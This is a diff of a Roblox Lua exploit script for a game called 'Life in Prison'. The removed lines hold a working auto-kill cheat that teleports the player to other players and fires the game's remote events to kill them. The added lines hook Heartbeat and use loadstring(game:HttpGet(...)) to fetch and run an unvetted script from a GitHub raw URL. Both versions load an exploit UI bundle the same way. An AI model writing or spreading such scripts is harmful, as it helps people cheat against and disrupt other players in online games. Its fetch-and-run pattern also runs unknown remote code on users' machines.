@@ -1,179 +1,43 @@
 local Iris = loadstring(game:HttpGet("https://raw.githubusercontent.com/x0581/Iris-Exploit-Bundle/2.0.4/bundle.lua"))().Init(game.CoreGui)
 
-local autoKillEnabled = Iris.State(false)
+local enabled = Iris.State(true)
 
-local GetService = setmetatable({}, {
-	__index = function(Self, Name)
-		Self[Name] = game:GetService(Name)
-		return Self[Name]
-	end
-})
+-- We'll store the original Heartbeat connection so we can kill it
+local originalConnection = nil
 
-local Players = GetService.Players
-local ReplicatedStorage = GetService.ReplicatedStorage
-local RunService = GetService.RunService
-local Workspace = GetService.Workspace
-local LocalPlayer = Players.LocalPlayer
-
-local RemoteEvent = nil
-
-local function FindRemoteEvent()
-    local paths = {
-        ReplicatedStorage:FindFirstChild("Events") and ReplicatedStorage.Events:FindFirstChild("RemoteEvent"),
-        ReplicatedStorage:FindFirstChild("Remote"),
-        ReplicatedStorage:FindFirstChild("RF") and ReplicatedStorage.RF:FindFirstChild("RemoteEvent"),
-        ReplicatedStorage:FindFirstChild("Remotes") and ReplicatedStorage.Remotes:FindFirstChild("RemoteEvent"),
-        ReplicatedStorage:FindFirstChild("Network") and ReplicatedStorage.Network:FindFirstChild("RemoteEvent")
-    }
-    
-    for _, remote in pairs(paths) do
-        if remote and remote:IsA("RemoteEvent") then
-            RemoteEvent = remote
-            return true
-        end
+-- This is a very hacky way – we override RunService.Heartbeat:Connect temporarily
+local oldConnect = RunService.Heartbeat.Connect
+RunService.Heartbeat.Connect = function(self, fn)
+    local conn = oldConnect(self, fn)
+    -- Assume the autokill script uses Heartbeat – store the first one we see after load
+    if not originalConnection then
+        originalConnection = conn
     end
-    return false
+    return conn
 end
 
-FindRemoteEvent()
+-- Load the script (it will use our hooked Connect)
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kvztrm/debug/refs/heads/main/lip"))()
 
-local Pickups = Workspace:WaitForChild("pickups")
-local TheTarget = nil
+-- Restore original method
+RunService.Heartbeat.Connect = oldConnect
 
-local function GetRandomSkyPosition()
-    local dist = math.random(5000000, 15000000)
-    local angle = math.random() * math.pi * 2
-    
-    local x = math.cos(angle) * dist
-    local z = math.sin(angle) * dist
-    local y = math.random(25000, 75000)
-    
-    return Vector3.new(x, y, z)
+-- Now use the toggle to kill/resume the connection
+enabled.changed = {} -- fake event since old Iris doesn't have it
+local oldSet = enabled.set
+enabled.set = function(self, v)
+    oldSet(self, v)
+    for _, cb in ipairs(enabled.changed) do cb(v) end
 end
 
--- Autokill control
-local autokillConnection = nil
-local lastEnabledState = false
-
-RunService.Heartbeat:Connect(function()
-    local currentEnabled = autoKillEnabled:get()
-    
-    if currentEnabled ~= lastEnabledState then
-        lastEnabledState = currentEnabled
-        
-        if currentEnabled then
-            -- Stop any old connection first
-            if autokillConnection then
-                autokillConnection:Disconnect()
-                autokillConnection = nil
-            end
-            
-            autokillConnection = RunService.Heartbeat:Connect(function()
-                local MyChar = LocalPlayer.Character
-                if not MyChar then return end
-                
-                local Humanoid = MyChar:FindFirstChildOfClass("Humanoid")
-                local Root = MyChar:FindFirstChild("HumanoidRootPart")
-                if not Humanoid or not Root then return end
-                
-                if Humanoid.Sit then Humanoid.Sit = false end
-                if Root.Anchored then Root.Anchored = false end
-                
-                local Backpack = LocalPlayer:FindFirstChild("Backpack")
-                local HasKnife = (MyChar:FindFirstChild("Knife")) or (Backpack and Backpack:FindFirstChild("Knife"))
-                
-                if not HasKnife then
-                    for _, Pickup in pairs(Pickups:GetChildren()) do
-                        if Pickup.Name == "Knife" then
-                            local MeshPart = Pickup:FindFirstChild("Meshes/knife1")
-                            if MeshPart and MeshPart:IsA("BasePart") and MeshPart.Parent then
-                                Root.CFrame = CFrame.new(MeshPart.Position)
-                                task.wait(0.2)
-                                
-                                if RemoteEvent then
-                                    RemoteEvent:FireServer(12, Pickup)
-                                end
-                                task.wait(0.2)
-                                break
-                            end
-                        end
-                    end
-                    return
-                end
-                
-                local Knife = MyChar:FindFirstChild("Knife") or (Backpack and Backpack:FindFirstChild("Knife"))
-                if not Knife then return end
-                
-                if TheTarget and TheTarget.Parent then
-                    local TargetChar = TheTarget.Character
-                    if TargetChar then
-                        local TargetRoot = TargetChar:FindFirstChild("HumanoidRootPart")
-                        local TargetHead = TargetChar:FindFirstChild("Head")
-                        local TargetHumanoid = TargetChar:FindFirstChildOfClass("Humanoid")
-                        local ForceField = TargetChar:FindFirstChildOfClass("ForceField")
-                        
-                        if TargetRoot and TargetHead and TargetHumanoid and TargetHumanoid.Health > 0 and not ForceField then
-                            local MyTeam = LocalPlayer.Team
-                            local TargetTeam = TheTarget.Team
-                            local IsPolice = MyTeam and MyTeam.Name == "Police"
-                            local TargetIsPolice = TargetTeam and TargetTeam.Name == "Police"
-                            
-                            Root.CFrame = TargetRoot.CFrame * CFrame.new(0, -6, 0)
-                            
-                            if IsPolice and TargetIsPolice then
-                                if Knife.Parent == MyChar then
-                                    pcall(function() Humanoid:UnequipTools() end)
-                                end
-                                if (Root.Position - TargetRoot.Position).Magnitude <= 17 then
-                                    if RemoteEvent then
-                                        RemoteEvent:FireServer(33, TargetHead)
-                                    end
-                                end
-                            else
-                                if Knife.Parent == Backpack then
-                                    pcall(function() Humanoid:EquipTool(Knife) end)
-                                end
-                                if (Root.Position - TargetRoot.Position).Magnitude <= 37 then
-                                    local Direction = (TargetHead.Position - Root.Position).Unit
-                                    if RemoteEvent then
-                                        RemoteEvent:FireServer(16, Knife, TargetHead, Direction)
-                                    end
-                                end
-                            end
-                            return
-                        end
-                    end
-                end
-                
-                TheTarget = nil
-                
-                for _, Player in pairs(Players:GetPlayers()) do
-                    if Player ~= LocalPlayer then
-                        local TargetChar = Player.Character
-                        if TargetChar then
-                            local TargetHumanoid = TargetChar:FindFirstChildOfClass("Humanoid")
-                            local ForceField = TargetChar:FindFirstChildOfClass("ForceField")
-                            if TargetHumanoid and TargetHumanoid.Health > 0 and not ForceField then
-                                TheTarget = Player
-                                break
-                            end
-                        end
-                    end
-                end
-                
-                if not TheTarget then
-                    local skyPos = GetRandomSkyPosition()
-                    Root.CFrame = CFrame.new(skyPos)
-                    task.wait(math.random(3, 6) / 10)
-                end
-            end)
+table.insert(enabled.changed, function(isOn)
+    if originalConnection then
+        if isOn then
+            -- Can't really resume a disconnected RBXScriptConnection – have to reload
+            warn("Cannot resume – reload script to re-enable")
         else
-            -- Safely stop
-            if autokillConnection then
-                autokillConnection:Disconnect()
-                autokillConnection = nil
-            end
-            TheTarget = nil
+            pcall(function() originalConnection:Disconnect() end)
+            warn("Autokill loop killed")
         end
     end
 end)
@@ -182,8 +46,8 @@ Iris:Connect(function()
     Iris.Window({"LIFE IN PRISON"})
     
     Iris.Tree({"MAIN"})
-        Iris.Checkbox({"AUTOKILL TOGGLE"}, {isChecked = autoKillEnabled})
-        Iris.Text({"AUTOKILL: " .. (autoKillEnabled:get() and "ENABLED" or "DISABLED")})
+        Iris.Checkbox({"AUTOKILL TOGGLE"}, {isChecked = enabled})
+        Iris.Text({"AUTOKILL: " .. (enabled:get() and "ENABLED" or "DISABLED")})
     Iris.End()
     
     Iris.End()
